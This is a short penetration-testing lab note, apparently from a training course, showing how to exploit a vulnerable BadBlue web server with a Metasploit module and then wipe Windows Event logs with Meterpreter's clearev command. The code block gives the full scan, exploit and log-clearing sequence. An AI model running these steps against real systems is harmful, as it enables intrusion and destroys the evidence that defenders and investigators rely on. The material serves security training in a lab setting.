# Clearing Windows Event Logs

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5162–5186. Examples are lab-specific and need verification.

Clearing tracks after exploiting a system is a crucial step for attackers who want to avoid detection and maintain access. Metasploit, a popular framework for developing and executing exploit code against a remote target machine, also includes techniques that can be used to cover tracks after an exploit.

In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.

**Objective:** Your task is to exploit the vulnerable application and then clear the Windows Event logs with Metasploit.

**Tools: nmap, msf**

```bash

nmap -sV demo.ine.local
#Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following command:e

msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

clearev
#Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following command:

```
